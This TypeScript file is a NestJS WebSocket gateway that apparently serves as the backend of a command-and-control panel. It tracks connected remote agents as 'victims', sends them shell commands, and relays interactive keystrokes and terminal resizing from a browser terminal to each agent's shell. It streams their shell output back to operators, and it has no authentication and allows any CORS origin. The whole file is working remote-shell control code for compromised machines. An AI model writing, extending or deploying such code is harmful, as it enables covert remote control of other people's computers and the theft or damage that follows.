// events/events.gateway.ts
import {
  OnGatewayConnection,
  OnGatewayDisconnect,
  SubscribeMessage,
  WebSocketGateway,
  WebSocketServer,
} from '@nestjs/websockets';
import { Server, Socket } from 'socket.io';
import { PrismaService } from 'src/prisma/prisma.service';

// Single gateway for both agents and the browser UI.
// Agents identify themselves with the `machine_id` query param;
// connections without it are treated as UI clients.
@WebSocketGateway({
  cors: { origin: '*' },
  perMessageDeflate: false,
})
export class EventsGateway implements OnGatewayConnection, OnGatewayDisconnect {
  @WebSocketServer()
  server: Server;

  constructor(private readonly prisma: PrismaService) {}

  private readonly __REMOTE_MACHINES__ = new Map<string, Socket>();

  async handleConnection(client: Socket) {
    const machine_id = client.handshake.query['machine_id'] as
      string | undefined;
    if (!machine_id) {
      console.log(`UI client connected: ${client.id}`);
      return;
    }
    this.__REMOTE_MACHINES__.set(machine_id, client);
    // The victim is normally created by POST /api/v1/machines/init before the
    // agent opens its socket. If that registration hasn't landed yet (race),
    // gracefully skip the state update rather than throwing P2025.
    try {
      await this.prisma.victim.update({
        where: { machine_id },
        data: { state: 'Online', updated_at: new Date() },
      });
    } catch (error: any) {
      if (error.code !== 'P2025') throw error;
      console.warn(
        `Socket connected for ${machine_id} but victim not registered yet`,
      );
    }
    this.server.emit('machine_state', { machine_id, state: 'Online' });
  }

  async handleDisconnect(client: Socket) {
    const machine_id = client.handshake.query['machine_id'] as
      string | undefined;
    if (!machine_id) {
      console.log(`UI client disconnected: ${client.id}`);
      return;
    }
    // Only clean up if this is still the registered socket — the machine may
    // have reconnected before the server noticed the old connection drop.
    if (this.__REMOTE_MACHINES__.get(machine_id) === client) {
      this.__REMOTE_MACHINES__.delete(machine_id);
      try {
        await this.prisma.victim.update({
          where: { machine_id },
          data: { state: 'Offline', updated_at: new Date() },
        });
      } catch (error: any) {
        if (error.code !== 'P2025') throw error;
      }
      this.server.emit('machine_state', { machine_id, state: 'Offline' });
    }
  }

  // ── Programmatic command execution (used by the HTTP /exec endpoint) ────────
  async emit__SH_EXEC__(machine_id: string, command: string): Promise<boolean> {
    const client = this.__REMOTE_MACHINES__.get(machine_id);
    if (!client)
      throw new Error(`Device ${machine_id} not found or is offline`);
    return (await client
      .timeout(5000)
      .emitWithAck(`SH_EXEC:${machine_id}`, { command })) as boolean;
  }

  // ── Raw interactive input (forwarded from the browser terminal) ─────────────
  // Called for every keystroke the user types in xterm.
  // The data string is forwarded as-is to the PTY stdin — no newline appended,
  // no buffering. The shell / readline on the agent owns everything from here.
  emit__SH_INPUT__(machine_id: string, data: string): void {
    const client = this.__REMOTE_MACHINES__.get(machine_id);
    if (!client) return;
    client.emit('SH_INPUT', { data });
  }

  // ── PTY resize ───────────────────────────────────────────────────────────────
  emit__SH_RESIZE__(machine_id: string, rows: number, cols: number): void {
    const client = this.__REMOTE_MACHINES__.get(machine_id);
    if (!client) return;
    client.emit('SH_RESIZE', { rows, cols });
  }

  // ── Shell output from the agent → streamed to every other connected socket ──
  @SubscribeMessage('SH_OUT')
  handleShOut(client: Socket, payload: { data: string }) {
    const machine_id = client.handshake.query['machine_id'] as string;
    const output = Buffer.from(payload.data, 'base64').toString('utf-8');
    client.broadcast.emit('output', { machine_id, output });
  }

  // ── Raw interactive input from the browser terminal → agent PTY stdin ───────
  // The UI sends every keystroke as-is; no newline is appended here.
  @SubscribeMessage('SH_INPUT')
  handleShInput(
    _client: Socket,
    payload: { machine_id: string; data: string },
  ) {
    if (!payload?.machine_id || typeof payload.data !== 'string') return;
    this.emit__SH_INPUT__(payload.machine_id, payload.data);
  }

  // ── PTY resize from the browser terminal ────────────────────────────────────
  @SubscribeMessage('SH_RESIZE')
  handleShResize(
    _client: Socket,
    payload: { machine_id: string; rows: number; cols: number },
  ) {
    if (!payload?.machine_id || !payload.rows || !payload.cols) return;
    this.emit__SH_RESIZE__(payload.machine_id, payload.rows, payload.cols);
  }
}
